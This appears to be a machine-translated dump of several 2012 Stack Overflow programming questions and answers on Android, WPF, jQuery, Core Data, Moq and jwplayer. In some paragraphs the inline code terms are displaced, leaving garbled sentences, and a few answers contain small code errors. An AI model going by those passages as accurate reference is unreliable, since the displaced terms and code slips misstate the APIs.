我试图有一个带有一堆按钮的页面，每个按钮都会增加自己的变量。当我第一次单击按钮时，变量增加没问题。但是，第二次，该值不会增加。我将所有侦听器都包含在 one`onclicklistener handler`中，这可能是问题的一部分，但如果这不能解决问题，或者有更简单的解决方法，我不想重写我的所有代码。代码：

```
final OnClickListener handler = new View.OnClickListener()
    {           
        public void onClick(View v)
        {
            Squad current = new Squad(BasketballGUIActivity.currentsquad);
            if (v == us2)
            {
                current.usTotal2++;
                us2.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us2);
                Log.e("ustotal2", ""+current.usTotal2);
                return;
            }
            if(v==us2made)
            {
                current.usTotal2made+=1;
                us2made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us2made); 
            }
            if(v==them2)
            {
                current.themTotal2+=1;  
                them2.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them2);   
            }
            if(v==them2made)
            {
                current.themTotal2made+=1;
                them2made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them2made);   
            }
            if(v==us1)
            {
                current.usTotal1+=1;
                us1.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us1); 
            }
            if(v==us1made)
            {
                current.usTotal1made+=1;
                us1made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us1made); 
            }
            if(v==them1)
            {
                current.themTotal1+=1;
                them1.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them1);   
            }
            if(v==them1made)
            {
                current.themTotal1made+=1;
                them1made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them1made);   
            }
            if(v==us0reb)
            {
                current.usTotalOreb+=1;
                us0reb.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us0reb);  
            }
            if(v==usxreb)
            {
                current.usTotalXreb+=1;
                usxreb.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(usxreb);  
            }
            if(v==them0reb)
            {
                current.themTotalOreb+=1;
                them0reb.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them0reb);    
            }
            if(v==themxreb)
            {
                current.themTotalXreb+=1;
                themxreb.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(themxreb);    
            }
            if(v==us3)
            {
                current.usTotal3+=1;
                us3.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us3); 
            }
            if(v==us3made)
            {
                current.usTotal3made+=1;
                us3made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us3made); 
            }
            if(v==them3)
            {
                current.themTotal3+=1;
                them3.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them3);   
            }
            if(v==them3made)
            {
                current.themTotal3made+=1;
                them3made.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them3made);   
            }
            if(v==us2foul)
            {
                current.usTotal2foul+=1;
                us2foul.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us2foul); 
            }
            if(v==us2foulmade)
            {
                current.usTotal2foulmade+=1;
                us2foulmade.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us2foulmade); 
            }
            if(v==us3foul)
            {
                current.usTotal3foul+=1;
                us3foul.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us3foul); 
            }
            if(v==us3foulmade)
            {
                current.usTotal3foulmade+=1;
                us3foulmade.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(us3foulmade); 
            }
            if(v==usTO)
            {
                current.usTotalTO+=1;
                usTO.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(usTO);    
            }
            if(v==them2foul)
            {
                current.themTotal2foul+=1;
                them2foul.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them2foul);   
            }
            if(v==them2foulmade)
            {
                current.themTotal2foulmade+=1;
                them2foulmade.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them2foulmade);   
            }
            if(v==them3foul)
            {
                current.themTotal3foul+=1;
                them3foul.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them3foul);   
            }
            if(v==them3foulmade)
            {
                current.themTotal3foulmade+=1;
                them3foulmade.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(them3foulmade);   
            }
            if(v==themTO)
            {
                current.themTotalTO+=1;
                themTO.getBackground().setColorFilter(Color.parseColor("#00FF00"), PorterDuff.Mode.DARKEN);
                new ButtonColorTask().execute(themTO);  
            }
} 
```

而且为了空间，是的，我将所有按钮初始化为侦听器（如果我不这样做，它们甚至不会第一次增加）。我想知道出了什么问题，以及是否有一种简单的方法可以解决此问题。我认为问题可能是我没有为每个按钮设置单独的侦听器，但我不确定。回顾一下，问题是当我单击一个按钮时，我的变量会增加一次，但不会超过一次。奇怪的是，实际上每次按下按钮都会运行`ButtonColorTask`（这只是在一定时间后将按钮的颜色更改回默认值），这真的让我更加困惑。任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:07:22.517

移动小队 current = new Squad(BasketballGUIActivity.currentsquad); 进入班级成员级别。

```
final OnClickListener handler = new View.OnClickListener()
    {           
        public void onClick(View v)
        {
            Squad current = new Squad(BasketballGUIActivity.currentsquad);
------>
final OnClickListener handler = new View.OnClickListener()
    {   
        Squad current = new Squad(BasketballGUIActivity.currentsquad);        
        public void onClick(View v)
        { 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:04:38.643

您检查特定按钮单击的方式是错误的。它应该如下：

```
 if(v.getId() == R.id.BUTTONID) { 
```

}

对所有其他按钮执行相同操作。我想这（以及将变量`current`从 中取出`onClick()`）应该可以解决您的问题。

# android - 通过单击按钮更改 Android SDK 中的背景颜色不起作用

> ID：11271047
> 
> 赞同：2
> 
> 时间：2012-06-30T02:52:54.423
> 
> 标签：android, sdk, colors, background

我有一个简单的程序，可以在单击按钮后更改背景颜色，但它不起作用

```
public class ChangeBackgroundActivity extends Activity {
/** Called when the activity is first created. */
    Button blueButton;
    LinearLayout myLO;
    @Override
   public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        myLO=(LinearLayout)findViewById(R.layout.main);
        blueButton=(Button)findViewById(R.id.button1);
        blueButton.setOnClickListener(new OnClickListener() {

            public void onClick(View arg0) {
            // TODO Auto-generated method stub
            myLO.setBackgroundColor(0x0000FF); //blue color code #0000FF    
        }
    });
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T02:58:39.720

试试这个，

**主要的.xml**

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:id="@+id/myLayout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <Button
            android:id="@+id/button1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_alignParentTop="true"
            android:layout_marginLeft="64dp"
            android:layout_marginTop="71dp"
            android:text="changeColor" />

    </LinearLayout> 
```

**ChangeBackgroundActivity.java**

```
public class ChangeBackgroundActivity extends Activity {
/** Called when the activity is first created. */
    Button blueButton;
    LinearLayout myLO;
    @Override
   public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        myLO=(LinearLayout)findViewById(R.id.myLayout);
        blueButton=(Button)findViewById(R.id.button1);
        blueButton.setOnClickListener(new OnClickListener() {

            public void onClick(View arg0) {
            // TODO Auto-generated method stub
            myLO.setBackgroundColor(Color.BLUE);

        }
    });
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T03:11:55.183

采用

```
myLO=(LinearLayout)findViewById(R.id.main); 
```

代替

```
myLO=(LinearLayout)findViewById(R.layout.main); 
```

你的布局必须是这样的

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:id="@+id/main"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <Button
            android:id="@+id/button1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
          />
</LinearLayout> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-02T06:55:38.713

您必须创建一个 xml 文件（选择器文件）并将其放在 res(res->drawable->yourselectorfile.xml 的可绘制文件夹中。之后在布局文件中的按钮背景中设置 xml 文件

**button_background_selector.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<selector
  xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_focused="true" android:state_pressed="false" android:drawable="@drawable/your_hover_image" />
    <item android:state_focused="true" android:state_pressed="true" android:drawable="@drawable/your_hover_image" />
    <item android:state_focused="false" android:state_pressed="true" android:drawable="@drawable/your_hover_image"/>
    <item android:drawable="@drawable/your_simple_image" />
</selector> 
```

现在将上述文件设置在按钮的背景中。

```
<Button
    android:layout_width="fill_parent" 
    android:layout_height="wrap_content"
    android:textColor="@color/grey_text"
    android:background="@drawable/button_background_selector"/> 
```

和改变颜色使用

```
<?xml version="1.0" encoding="utf-8"?>
 <selector xmlns:android="http://schemas.android.com/apk/res/android">
     <item android:state_pressed="true"
           android:color="#000000" /> <!-- pressed -->
     <item android:state_focused="true"
           android:color="#000000" /> <!-- focused -->
     <item android:color="#FFFFFF" /> <!-- default -->
 </selector> 
```

作为你的 button_background_selector.xml

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-06T07:37:11.117

使用这个，这对我有用：

```
YourView.setBackgroundColor(Color.argb(255, 255, 255, 255)); 
```

# c# - CollectionViewSource 不会在属性更改时重新排序

> ID：11271048
> 
> 赞同：14
> 
> 时间：2012-06-30T02:53:04.563
> 
> 标签：c#, wpf, binding, mvvm, collections

我将 ItemsControl 绑定到 CollectionViewSource。这是代码：

```
this.Trucks = new ObservableCollection<Truck>();
            foreach (var truck in DataRepository.Trucks.Where(t => t.ReadyDate.Date.Equals(this.Date)))
            {
                this.Trucks.Add(truck);
            }

            this.TrucksSource = new CollectionViewSource { Source = this.Trucks };
            this.TrucksSource.SortDescriptions.Add(new SortDescription("ReadyAddress.Region.RegionNumber", ListSortDirection.Ascending));
            this.TrucksSource.SortDescriptions.Add(new SortDescription("TruckId", ListSortDirection.Ascending)); 
```

当我最初绑定时 - 排序工作。当我将项目添加到 ObservableCollection 时 - 它被插入到正确的位置，这很好。但是当我更改我排序的属性时 - 这个项目没有在列表中“移动”。

`ReadyAddress.Region.RegionNumber`正确引发 INotifyPropertyChanged 并且我在绑定字段中看到它，但顺序没有改变。我是否期望一些不应该发生的事情或者有更好的方法来处理这个？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2018-11-08T21:00:54.333

迟到的答案，但在 4.5 中添加了 ListCollectionView（ListBox 和 CollectionViewSource.View 的默认实现）新属性以实现这一点。

您可以使用 IsListSorting 和 ListSortingProperties 来启用自动排序。不，它不会重建视图

```
list.SortDescriptions.Add(new SortDescription("MyProperty", ListSortDirection.Ascending));
list.IsLiveSorting = true;
list.LiveSortingProperties.Add("MyProperty"); 
```

这应该在属性`MyProperty`更改时使用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-04T00:42:40.447

我找到的所有答案都提到`View.Refresh()`了，但这对于大列表来说不是很好的解决方案。我最终做的是`Remove()`和`Add()`这个项目。然后它被正确地重新定位而不重新加载整个列表。

警告！它适用于我的工作，但在您的情况下，删除对象并重新添加可能会导致副作用，具体取决于您的代码编写方式。在我的情况下，它是一个具有 UI 效果的列表，其中新项目显示为过渡，因此刷新将在整个列表中显示过渡，其中删除/添加很好地显示了项目如何重新定位。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-30T03:15:49.910

您是否尝试过刷新您的 collectionviewsource？

```
 this.TruckSource.View.Refresh(); 
```

# jquery - ID 属性不起作用，但 CLASS 起作用？

> ID：11271050
> 
> 赞同：1
> 
> 时间：2012-06-30T02:54:37.607
> 
> 标签：jquery

我在练习 JQuery 时遇到了这个问题。

在下面的代码中，我试图在单击“是”时显示一个输入框，并在单击“否”时隐藏它。

当我的 INPUT 标记具有 CLASS 属性时，我的 JQuery 语法中的 ELSE IF 语句可以完美运行。

但是，如果我将 CLASS 属性替换为 ID 属性（ID="box1"，ID="box2"），则只有 IF 语句有效，但 ELSE IF 无效。（请注意，我为 ID 和 CLASS 使用了适当的 Jquery 选择器，所以这可能不是问题）。

有人可以帮我吗？答案可能简单明了，但我是 JQuery 的初学者，这个问题让我感到疑惑。提前致谢！

编辑：这是问题代码：

PS：我在评论中发布此代码时遇到问题，所以我想我会编辑原始代码片段。希望这可以帮助！！！

```
<style type="text/css">
    #box2{
        display: none;
    }
</style>

<script>
    $(function(){           
        $("#box1").click(function(){
            var x = $(this).val();

            if (x == "Yes")
            {
                $("#box2").css("display", "inline");
            }
            else if (x == "No")
            {
                $("#box2").css("display", "none");
            }               
        }); 
    });
</script>
</head>

<body>  
<input type="radio" name="color" Id="box1" value="Yes"> Yes
<input type="radio" name="color" Id="box1" value="No"> No

<input type="text" size="10" name="exp" Id="box2"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:45:24.310

正如其他人回答的那样，ID 必须是唯一的；类没有。此外，它会比更改 css 以使用 hide() 和 show() 更好。

改成：

```
if (x == "Yes")  
{  
 $(".box2").show();  
}  
else if (x == "No")  
{  
  $(".box2").hide();  
} 
```

应该更容易阅读您的代码。另外，考虑研究toggle()。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T02:58:39.667

**使用[http://jsfiddle.net/FsaJH/1/的](http://jsfiddle.net/FsaJH/1/)**工作演示**`id`**

 **希望您正确添加正确的 id，而不是在 DOM 中复制它们。

如果我错过了什么，请让我知道，这应该会有所帮助

**代码**

```
 $(function(){           
        $("#box1, #box2").click(function(){  //<== chaining the ids here
            var x = $(this).val();  

            if (x == "Yes")  
            {  
                $(".box2").css("display", "inline");  
            }  
            else if (x == "No")  
            {  
                $(".box2").css("display", "none");  
            }                 
        });   
    });  ​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T03:02:55.233

我的疯狂猜测——你实际上并没有显示有问题的代码；您显示*工作*代码 - 是您在多个元素上使用相同的 ID。ID 应该是唯一的。也就是说，我会这样写：

```
<input type="radio" name="color" id="box1" value="Yes"> Yes  
<input type="radio" name="color" id="box2" value="No"> No  

<input type="text" size="10" name="exp" id="box3"> 
```

JavaScript：

```
$(function(){           
    $("#box1, #box2").click(function(){  
        var x = $(this).val(); 
        $("#box3").css("display", x == "Yes" ? "inline" : "none");       
    });   
}); 
```

例子：

*   [http://jsfiddle.net/WgLUt/](http://jsfiddle.net/WgLUt/)**

# objective-c - NSManagedObject 无法保存其属性，但在添加相关对象时可以保存

> ID：11271053
> 
> 赞同：1
> 
> 时间：2012-06-30T02:56:00.827
> 
> 标签：objective-c, ios, core-data, nsmanagedobject

我正在使用 Core Data 开发一个 iOS 应用程序。我有一个与,实体和与实体`Log`的关系具有一对多关系的实体。该日志还具有, ,属性。我可以创建日志、更改其属性、添加实体，这些更改会正确显示，直到我退出应用程序。所有的更改都会消失，而我正在查看 sqlite 数据库，所有这些更改都从未保存在数据库中。在数据库中，对象只会被创建，但不会链接到对象。`Audio``Photo``one-to-one``Status``text``longitude``latitude``status``status``log`

但是如果我在 or 中添加一个`audio`or`photo`对象，我对`log.audioSet`or`log.photoSet`所做`log`的更改，包括对`text`or的更改`status`，都会突然保存到数据库中。

因此，似乎更改仅保留在`NSManagedObjectContext`, 直到添加相关的 one_to_many 实体并且`[[LTLogStore sharedStore] saveChanges]`将突然开始工作。

我正在使用单例来管理`NSManagedObjectContext`. 有任何想法吗？

如果相关，我会发布一些代码。谢谢。

更新：我不确定这些代码是否足够。但基本上一切正常，并显示，它只是不保存到数据库中。我正在使用`mogenerator`来设置`text`and `latitude`，但是因为一切都在上下文中。我不确定这是您可能需要的代码。

代码：

```
@interface LTLogStore : NSObject{
}

+ (LTLogStore *)sharedStore;

- (void)removeItem:(Log *)p;

- (Log *)createItem;

- (BOOL)saveChanges;

@property(nonatomic, strong) NSFetchedResultsController *resultsController;
@property(nonatomic, strong) NSManagedObjectModel *model;
@property(nonatomic, strong) NSManagedObjectContext *context;

@end

@implementation LTLogStore
@synthesize resultsController;
@synthesize context, model;

+ (LTLogStore *)sharedStore
{
    static LTLogStore *sharedStore = nil;
    if(!sharedStore){
        sharedStore = [[super allocWithZone:nil] init];
    }

    return sharedStore;
}

+ (id)allocWithZone:(NSZone *)zone
{
    return [self sharedStore];
}

- (id)init 
{
    self = [super init];
    if(self) {                
        model = [NSManagedObjectModel mergedModelFromBundles:nil];

        NSPersistentStoreCoordinator *psc = 
        [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:model];

        // Where does the SQLite file go?    
        NSString *path = [self itemArchivePath];
        NSURL *storeURL = [NSURL fileURLWithPath:path]; 

        NSError *error = nil;

        if (![psc addPersistentStoreWithType:NSSQLiteStoreType 
                               configuration:nil
                                         URL:storeURL
                                     options:nil
                                       error:&error]) {
            [NSException raise:@"Open failed"
                        format:@"Reason: %@", [error localizedDescription]];
        }

        // Create the managed object context
        context = [[NSManagedObjectContext alloc] init];
        [context setPersistentStoreCoordinator:psc];

        // The managed object context can manage undo, but we don't need it
        [context setUndoManager:nil];

    }
    return self;
}

- (NSFetchedResultsController *)resultsController {
    if (resultsController !=nil) {
        return resultsController;
    }

    NSFetchRequest *request = [[NSFetchRequest alloc] init];

    NSEntityDescription *e = [[model entitiesByName] objectForKey:@"Log"];
    [request setEntity:e];

    NSSortDescriptor *sd = [NSSortDescriptor 
                            sortDescriptorWithKey:@"created_at"
                            ascending:NO];
    [request setSortDescriptors:[NSArray arrayWithObject:sd]];
    [request setReturnsObjectsAsFaults:NO];

    NSFetchedResultsController *fetchedResultsController = [[NSFetchedResultsController alloc]
                                                            initWithFetchRequest:request 
                                                            managedObjectContext:context
                                                            sectionNameKeyPath:nil cacheName:@"Root"];

    NSError *error;
    BOOL success = [fetchedResultsController performFetch:&error];
    if (!success) {
        //handle the error
    }

    return fetchedResultsController;
} 

- (NSString *)itemArchivePath
{
    NSArray *documentDirectories =
    NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                        NSUserDomainMask, YES);

    // Get one and only document directory from that list
    NSString *documentDirectory = [documentDirectories objectAtIndex:0];

    NSString *storePath = [documentDirectory stringByAppendingPathComponent:@"store.data"];
    return storePath;
}

- (BOOL)saveChanges
{
    NSError *err = nil;
    BOOL successful = [context save:&err];
    NSLog(@"Saving changes to the database");
    if (!successful) {
        NSLog(@"Error saving: %@", [err localizedDescription]);
    }
    return successful;
}

- (void)removeItem:(Log *)l
{
    [context deleteObject:l];
    [self saveChanges];
}

- (Log *)createItem
{    
    Log *p = [NSEntityDescription insertNewObjectForEntityForName:@"Log"
                                            inManagedObjectContext:context];
    [self saveChanges];
    return p;
}

@end

@interface Log : _Log {
}

//these two are some custom convenience methods for location attributes, but it does the work of setting the longitude and latitude value in the log object, but calling the [[LTLogStore sharedStore] saveChanges] still won't save it into the database.
-(CLLocation*)location;
-(void)setLocation:(CLLocation*)location;

//this all works 
-(Audio*)newAudio;
-(Audio*)newAudioWithPath:(NSString*)audioPath;
//after calling this method, even the log.text changes will be saved to the database.
-(void)addAudioWithPath:(NSString*)audioPath;    
-(void)removeAudio:(Audio*)audio;

@end

#import "Log.h"
#import "Audio.h"
#import "LTLogStore.h"

@implementation Log

-(CLLocation*)location{
    if (!self.longitude || !self.latitude) {
        return nil;
    }
    CLLocation *l = [[CLLocation alloc] initWithLatitude:[self.latitude doubleValue] longitude:[self.longitude doubleValue]];
    return l;
}

-(void)setLocation:(CLLocation*)location{
    if (location==nil) {
        self.latitude = nil;
        self.longitude = nil;
    }
    self.latitude = [NSNumber numberWithDouble: location.coordinate.latitude];
    self.longitude = [NSNumber numberWithDouble:location.coordinate.longitude];
    [[LTLogStore sharedStore] saveChanges];
}

-(Audio*)newAudio{
    Audio *a = [Audio new];
    a.log = self;
    return a;
}

-(Audio*)newAudioWithPath:(NSString*)audioPath{
    Audio *new = [self newAudio];
    [new setKey:audioPath];
    return new;
}

-(void)addAudioWithPath:(NSString*)audioPath{
    Audio *new = [self newAudio];
    [new setKey:audioPath];
    [[LTLogStore sharedStore] saveChanges];
}

-(void)removeAudio:(Audio*)audio{
    [self.audiosSet removeObject:audio];
    [[[LTLogStore sharedStore] context] deleteObject:audio];
    [[LTLogStore sharedStore] saveChanges];
}

@end 
```

更新：

问题解决，看答案。

更新问题：为什么我的覆盖导致问题？有人能解释一下 Core Data 神奇背后的原因，或者 KVO 背后的原因吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-30T09:50:48.353

问题解决了，我覆盖了Log类中的willChangeValueForKey方法，导致这个问题，我以为代码无关。但它是：

```
- (void)willChangeValueForKey:(NSString *)key{
    //I added the following line to fix my problem
    [super willChangeValueForKey:key];

    //this is the original line, I want to have this 
    //because I want to have a isBlank property 
    //so I can see if the user modified the log
    _isBlank = false;

    //I tried to also add the following line to be safe.
    //turns out this line is not needed, and it will make the problem occur again
    //[super didChangeValueForKey:key];

} 
```

# c# - 如何使用 moq 来验证是否将类似的对象作为参数传入？

> ID：11271057
> 
> 赞同：39
> 
> 时间：2012-06-30T02:57:19.593
> 
> 标签：c#, unit-testing, moq

我有几次这样的事情会有所帮助。例如，我有一个`AccountCreator`带有. 我有一个最终将用于创建帐户的帐户。我将首先将属性从to映射到，然后将其传递到 repo 以最终创建它。我的测试看起来像这样：`Create``NewAccount``AccountCreator``IRepository``AccountCreator``NewAccount``Account``Account`

```
public class when_creating_an_account
{
    static Mock<IRepository> _mockedRepository;
    static AccountCreator _accountCreator;
    static NewAccount _newAccount;
    static Account _result;
    static Account _account;

    Establish context = () =>
        {
            _mockedRepository = new Mock<IRepository>();
            _accountCreator = new AccountCreator(_mockedRepository.Object);

            _newAccount = new NewAccount();
            _account = new Account();

            _mockedRepository
                .Setup(x => x.Create(Moq.It.IsAny<Account>()))
                .Returns(_account);
        };

    Because of = () => _result = _accountCreator.Create(_newAccount);

    It should_create_the_account_in_the_repository = () => _result.ShouldEqual(_account);
} 
```

所以，我需要的是替换的东西`It.IsAny<Account>`，因为这并不能帮助我验证是否创建了正确的帐户。令人惊奇的是……

```
public class when_creating_an_account
{
    static Mock<IRepository> _mockedRepository;
    static AccountCreator _accountCreator;
    static NewAccount _newAccount;
    static Account _result;
    static Account _account;

    Establish context = () =>
        {
            _mockedRepository = new Mock<IRepository>();
            _accountCreator = new AccountCreator(_mockedRepository.Object);

            _newAccount = new NewAccount
                {
                    //full of populated properties
                };
            _account = new Account
                {
                    //matching properties to verify correct mapping
                };

            _mockedRepository
                .Setup(x => x.Create(Moq.It.IsLike<Account>(_account)))
                .Returns(_account);
        };

    Because of = () => _result = _accountCreator.Create(_newAccount);

    It should_create_the_account_in_the_repository = () => _result.ShouldEqual(_account);
} 
```

请注意，我更改`It.IsAny<>`为`It.IsLike<>`并传入了一个填充`Account`对象。理想情况下，在后台，一些东西会比较属性值，如果它们都匹配则让它通过。

那么，它已经存在了吗？或者这可能是您以前做过的事情并且不介意共享代码？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-07-05T19:43:58.953

要存根存储库以根据类似条件返回特定值，以下应该有效：

```
_repositoryStub
    .Setup(x => x.Create(
        Moq.It.Is<Account>(a => _maskAccount.ToExpectedObject().Equals(a))))
    .Returns(_account); 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-07-03T05:32:09.277

以下内容应该适合您：

```
Moq.It.Is<Account>(a=>a.Property1 == _account.Property1) 
```

但是，正如前面提到的，您必须实施匹配标准。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-05T17:46:44.410

我找不到任何与问题中描述的完全一致的东西。同时，我能找到的处理作为参数传递给模拟方法的对象的验证的最佳方法（没有引用平等的奢侈）是结合`Callback`预期对象模式来比较实际对象和预期对象：

```
public class when_creating_an_account
{
    static Mock<IRepository> _mockedRepository;
    static AccountCreator _accountCreator;
    static NewAccount _newAccount;
    static Account _result;
    static Account _expectedAccount;
    static Account _actualAccount;

    Establish context = () =>
        {
            _mockedRepository = new Mock<IRepository>();
            _accountCreator = new AccountCreator(_mockedRepository.Object);

            _newAccount = new NewAccount
                {
                    //full of populated properties
                };
            _expectedAccount = new Account
                {
                    //matching properties to verify correct mapping
                };

            _mockedRepository
                .Setup(x => x.Create(Moq.It.IsAny<Account>(_account)))
                //here, we capture the actual account passed in.
                .Callback<Account>(x=> _actualAccount = x) 
                .Returns(_account);
        };

    Because of = () => _result = _accountCreator.Create(_newAccount);

    It should_create_the_account_in_the_repository = 
        () => _result.ShouldEqual(_account);

    It should_create_the_expected_account = 
        () => _expectedAccount.ToExpectedObject().ShouldEqual(_actualAccount);
} 
```

预期的对象模式很棒，但是在 C# 中实现起来很复杂，所以我使用了一个库来为我处理所有这些。[https://github.com/derekgreer/expectedObjects](https://github.com/derekgreer/expectedObjects)

我最后一次观察查看传入的实际帐户中的属性，并将每个属性与我的“预期对象”上的相同属性进行比较。这样我就没有大量的模拟属性检查列表，也没有大量的测试观察结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-07T15:20:17.513

如果我使用`JSONConvert.SerializeObject`将预期对象和实际对象转换为 JSON 字符串，然后`equals`在它们之间进行操作，它似乎确实会产生可接受的结果。我的想法是，如果对象的字符串表示匹配，那么它们的公共属性很可能也是相同的。

# javascript - 将可变数据添加到 JSON

> ID：11271058
> 
> 赞同：1
> 
> 时间：2012-06-30T02:57:20.543
> 
> 标签：javascript, json, jwplayer

我有以下 Javascript 用于使用 jwplayer 将音乐文件作为播放列表播放

```
function playAllAudio() {
var audioDiv = "<div id='audioplayer'></div>";
    //Get ids from selected files
var sData = $('input', oTable.fnGetNodes()).serialize();

$.post("mediaStream.do", {OID : sData},function(data) {     
    jwplayer('audioplayer').setup({
        'controlbar': 'bottom',
        'width': '470',
        'height': '24',
        //'playlist': [{file:'mp3:audio/audioMotion'},{file:'mp3:audio/audioTangled'},{file:'mp3:audio/audioSunHands'}],
         'playlist': data,
        'provider': 'rtmp',
        'streamer': 'rtmp://XXXXXXX.cloudfront.net:1935/cfx/st',
        'modes': [
            {type: 'flash', src: 'https://YYYYYYYYY.cloudfront.net/player.swf'}
        ]
    });

});
} 
```

数据作为 JSON 字符串动态创建，其中的值是为 jwplayer 格式化的歌曲文件名

```
var data = "[{file:'mp3:audio/audioMotion'},{file:'mp3:audio/audioTangled'}]"; 
```

但是，当我使用变量“数据”时，jwplayer 不起作用。我如何使它与从服务器传递到 javascript 的数据一起工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T03:47:11.970

动态创建的数据是一个[JSON](http://json.org/)字符串，但是 jwplayer 的`playlist`配置应该是一个数组，你必须先将字符串覆盖到一个数组中：

```
var data = "[{file:'mp3:audio/audioMotion'},{file:'mp3:audio/audioTangled'}]";
data = JSON.parse(data); // with out IE8- 
```

但`JSON`在 IE8 中不支持，您可以使用 Douglas Crockford 的[json2](https://github.com/douglascrockford/JSON-js/blob/master/json2.js)来修复它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T03:45:24.750

您可以像这样做一样传递它，作为来自 mediaStream.do 调用的响应。

你确定json有效吗？您是否尝试过使用[http://jsonlint.com/](http://jsonlint.com/)验证响应？

# jquery - jQuery client event not working in on Safari 5.1

> ID：11271067
> 
> 赞同：0
> 
> 时间：2012-06-30T02:58:20.010
> 
> 标签：jquery, ipad, jquery-mobile, safari

I am working a mobile website, using jQuery Mobile. Safari browser (5.1) not recognzing jQuery click event - like ("#button1").click (function (){ ...... });

Any idea?

Code Snippets:

```
$("#submit").click(function () {
    alert("hello");
});

<form id="loginForm" class="validate" action=""  method="get">
<input type="button" id="submit" name="submit" value="LOGIN" /> </form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T03:38:26.390

The JavaScript `click` event is not always fired in some mobile browsers, so you may also have to bind to the `tap` event, like this:

```
$("#submit").bind("click tap", function () {
      alert("hello");
}); 
```

More information on jQuery Mobile events here: [http://jquerymobile.com/test/docs/api/events.html](http://jquerymobile.com/test/docs/api/events.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T09:24:26.953

```
$("#submit").on("click", function () {
      alert("hello");
}); 
```

Please refer to

